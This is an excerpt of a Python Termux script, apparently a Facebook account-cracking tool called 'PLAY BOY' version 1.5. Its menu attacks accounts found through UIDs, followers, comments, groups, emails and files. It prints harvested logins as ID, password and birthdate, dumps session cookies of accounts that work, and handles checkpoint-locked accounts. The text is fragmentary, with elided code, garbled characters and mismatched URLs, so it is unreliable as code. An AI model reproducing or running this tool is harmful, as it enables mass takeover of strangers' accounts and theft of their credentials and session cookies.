...
| $$      | $$      | $$  | $$    | $$          | $$  \ $$| $$  | $$    | $$          
| $$      | $$$$$$$$| $$  | $$    | $$          | $$$$$$$/|  $$$$$$/    | $$          
|__/      |________/|__/  |__/    |__/          |_______/  \______/     |__/          
                                                                                     
Login success ðŸ˜Š {kk}user{P}, script by {kk} PLAY BOY{P} version 1.5""")
...
def uaku():
	...
	try:
		...
		a=requests.get('https://github.com/playboy167/offline-approval.txt.git').text
...
def menu(n,t,c):
	...
	print(f" [{hh}02{P}] CRACK UID          [{hh}08{P}] CRACK  FILE")

	print(f" [{hh}03{P}] CRACK FOLLOWER [{hh}09{P}] CHECK ID")

	print(f" [{hh}04{P}] CRACK COMMENT   [{hh}10{P}] CHECK OK")

	print(f" [{hh}05{P}] CRACK GROUP       [{hh}11{P}] CHECK CP")

	print(f" [{hh}06{P}] CRACK EMAIL       [{hh}12{P}] EXIT ({M}cookie{P})")

	ask = input(f' â””â”€ MENU : ')
...
def cek_opsi_cp():
	...
	exc = input(f' â””â”€ nomor yang akan di cek\n nomor : ')
...
def crack_masal(t,c):
    ...
    print(f' [{hh}<{P}] Bangladesh akun bersifat publik ')
...
def crack_group():
	...
	link = input(f' [{hh}<{P}] Bangladesh group Termux help center \n id group : ')

	url = "https://youtube.com/channel/UCMwVbl52U3fGjWNstqbymAA"+link
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							print(f'\r â””â”€â”€{kk} {idf}|{pw}|{lahir}|{ua}\n{x}')

							#print(f'\r â””â”€â”€â”€â”€ {hh}{ua}{x}')
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						...
						print(f'\r â””â”€â”€{hh} {idf}|{pw}|{lahir}|{tahun}\n{x}')

						print(f'\r{x} â””â”€â”€{hh}{kuki}|{ua}{x}')

						#print(f'\r{x} â””â”€â”€â”€â”€ {hh}{ua}{x}')
...
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
	...
	try:
		...
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			...
			akun += f'\n â””â”€ akun tapyes!!.. segera check di fb lite/mbasicðŸŽ‰{P}                       '
		...
		akun += f'\n â””â”€ {M}password akun telah diganti!!                      {P}'
...
def cek_apk(idf,pw,kuki):
	...
	try:		
		...
		url = "https://www.facebook.com/profile.php?id=100072883587040"
